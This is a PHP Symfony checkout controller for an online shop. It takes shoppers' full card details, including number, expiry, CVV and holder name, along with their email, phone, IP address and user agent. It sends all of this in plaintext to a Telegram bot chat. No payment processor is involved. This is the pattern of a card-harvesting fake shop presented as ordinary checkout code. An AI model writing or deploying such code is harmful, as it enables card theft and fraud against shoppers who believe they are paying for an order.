<?php

declare(strict_types=1);

namespace App\Integration\Application\Controller\Api;

use App\Cart\Domain\Service\CartService;
use App\Product\Infrastructure\Service\ProductsProviderService;
use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\Routing\Attribute\Route;
use Symfony\Contracts\HttpClient\Exception\ClientExceptionInterface;
use Symfony\Contracts\HttpClient\Exception\RedirectionExceptionInterface;
use Symfony\Contracts\HttpClient\Exception\ServerExceptionInterface;
use Symfony\Contracts\HttpClient\Exception\TransportExceptionInterface;
use Symfony\Contracts\HttpClient\HttpClientInterface;

#[Route(path: '/api/cart/checkout', methods: ['POST'])]
final class CheckoutController extends AbstractController
{
    private array $products;

    public function __construct(
        ProductsProviderService              $productsProviderService,
        private readonly CartService         $cartService,
        private readonly HttpClientInterface $client,
        private readonly string              $token,
        private readonly string              $chatId,
    )
    {
        $this->products = $productsProviderService->getProducts();
    }

    public function __invoke(Request $request): Response
    {
        $cart = $this->cartService->getCart();

        if (empty($cart)) {
            return $this->json(['success' => false, 'message' => 'Cart is empty']);
        }

        $email = $request->getPayload()->get('email', '');
        $phone = $request->getPayload()->get('phone', '');

        if (empty($email) || empty($phone) || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
            return $this->json(['success' => false, 'message' => 'Email and phone are required, email must be valid']);
        }

        $cardNumber = $request->getPayload()->get('cardNumber', '');
        $cardExpiryMonth = $request->getPayload()->get('cardExpiryMonth', '');
        $cardExpiryYear = $request->getPayload()->get('cardExpiryYear', '');
        $cardCvv = $request->getPayload()->get('cardCvv', '');
        $cardHolderName = $request->getPayload()->get('cardHolderName', '');

        if (empty($cardNumber) || empty($cardExpiryMonth) || empty($cardExpiryYear) || empty($cardCvv) || empty($cardHolderName) || !is_numeric($cardCvv) || $cardCvv <= 0 || $cardCvv > 999) {
            return $this->json(['success' => false, 'message' => 'Card data are not correct']);
        }

        $message = "New order received:\n";
        foreach ($cart as $productId => $quantity) {
            $productName = $this->products[$productId]['name'] ?? $productId;
            $message .= "$productName: $quantity\n";
        }

        $message .= "-----\n" .
            "Card data:\n" .
            "Number: $cardNumber\n" .
            "Expired at: $cardExpiryMonth/$cardExpiryYear\n" .
            "CVV: $cardCvv\n" .
            "Holder name: $cardHolderName\n";

        $message .= "-----\n" .
            "Email: $email\n" .
            "Phone: $phone\n";

        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_X_REAL_IP'] ?? $_SERVER['REMOTE_ADDR'];
        $userAgent = $_SERVER['HTTP_USER_AGENT'];
        $message .= "-----\n" .
            "IP: $ip\n" .
            "User-Agent: $userAgent";

        $url = 'https://api.telegram.org/bot' . $this->token . '/sendMessage';
        $params = [
            'chat_id' => $this->chatId,
            'text' => $message,
        ];

        try {
            $response = $this->client->request('POST', $url, ['body' => $params]);
            $responseBody = $response->getContent();
            $responseData = json_decode($responseBody, true);

            if ($responseData['ok']) {
                $this->cartService->clearCart();
                return $this->json(['success' => true, 'message' => 'Order sent to Telegram']);
            } else {
                return $this->json(['success' => false, 'message' => 'Failed to send message to Telegram']);
            }
        } catch (ClientExceptionInterface|RedirectionExceptionInterface|ServerExceptionInterface|TransportExceptionInterface $e) {
            error_log('Telegram send error: ' . $e->getMessage());

            return $this->json(['success' => false, 'message' => 'Error sending message' . $e->getMessage()]);
        }
    }
}
